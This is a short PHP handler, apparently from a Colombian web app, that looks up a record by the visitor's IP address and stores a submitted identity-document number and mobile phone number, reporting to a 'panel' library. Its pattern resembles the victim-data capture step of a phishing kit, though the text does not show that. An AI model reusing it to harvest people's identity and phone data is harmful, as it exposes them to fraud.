<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip);

$documento = $_POST['doc'];
$celular = $_POST['cel'];

actualizar_registro_info($registro,$documento,$celular);
?>